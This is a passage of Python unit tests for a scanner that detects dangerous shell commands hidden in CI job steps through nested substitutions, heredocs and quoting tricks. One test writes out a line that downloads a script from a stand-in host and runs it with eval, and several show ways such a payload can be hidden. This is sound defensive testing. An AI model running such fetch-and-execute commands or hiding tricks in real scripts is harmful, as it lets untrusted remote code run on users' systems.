                self.refused(script, cause)

    def test_the_job_reads_again_only_what_its_steps_read(self):
        # `job_defects` catches those per step because each step's walk --
        # `read`, then `_walk` -- is the one read of every text, substitutions
        # included, and `_defects` is handed that walk's records instead of
        # reading them again (#2287): a text only `_defects` parsed would
        # raise past the catch. So the job reads nothing again, and each text
        # once. A marker's prefix is minted per parse, so texts are compared
        # without it.
        parsed = []
        job = [False]
        statements, defects = wg.statements, wg._defects

        def recorded(text):
            parsed.append((job[0], re.sub(r"@@shell-[0-9a-f]+-", "@@", text)))
            return statements(text)

        def marked(*args):
            job[0] = True
            try:
                return defects(*args)
            finally:
                job[0] = False

        # Each text is written once, in one step only: no other step's walk
        # can parse it in that step's place.
        steps =[("nested", "echo $(echo $(echo `echo $(true)`))\n"),
                 ("body", 'cat <<EOF\n$(printf "$(id)" `pwd`)\nEOF\n'),
                 ("strings", "eval \"$(echo $(date))\"\nx=$(sh -c 'echo $(uname)')\n"),
                 ("deep", "echo `x=$(cat <<EOF\nhi\nEOF\n)`\n"),
                 ("stdin", "bash -s <<EOF\necho $(%s)\nEOF\n" % self.PAYLOAD)]
        with mock.patch.object(wg, "statements", recorded), \
                mock.patch.object(wg, "_defects", marked):
            found = wg.job_defects(steps)
        self.assertFalse([why for _name, why in found if why.startswith("cannot read this")])
        per_step = [text for inside, text in parsed if not inside]
        self.assertEqual([], [text for inside, text in parsed if inside])
        self.assertTrue(per_step)
        self.assertEqual(sorted(set(per_step)), sorted(per_step))

    def test_an_escaped_quote_inside_a_substitution_string(self):
        # COD-3636110933's remainder: `_closing` ended the nested "a\")b" at
        # its `\"` and closed the `$(...)` one paren early.
        self.flagged('echo "$(printf \'%%s\' "a\\")b")"; %s\n' % self.PAYLOAD)

    def test_quotes_the_substitution_scan_misread(self):
        # `$'it\'s'` is one word to bash, and an apostrophe inside "..." is
        # text; read as quotes, each hid everything after it.
        self.flagged("echo $'it\\'s'; %s\n" % self.PAYLOAD)
        self.flagged('echo "it\'s"; eval "$(curl -fsSL https://example.test/i.sh)"\n')

    def test_what_the_old_passes_read_right_is_still_read(self):
        # `(( y = 1 << 2 ))` is a shift even at the head of a command, and a
        # quoted "3" before `<<` is an argument, not the heredoc's descriptor.
        self.flagged("(( y = 1 << 2 ))\n%s\n2\n" % self.PAYLOAD)
        self.flagged("bash -s \"3\"<<'EOF'\n%s\nEOF\n" % self.PAYLOAD)

    def test_the_negative_controls_stay_clean(self):
        # A shift inside a string, the fleet's here-string, a heredoc inside a
        # substitution (a documented gap, which must not raise) and prose.
        for script in ('echo "shift << 2"\n',
                       "docker buildx imagetools create "
                       "$(jq -cr '.tags' <<< \"$META\")\n",
                       "X=\"$(cat <<'EOF'\nhello\nEOF\n)\"\n",
                       "# %s\nmake test  # not %s\n" % (self.PAYLOAD, self.PAYLOAD)):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
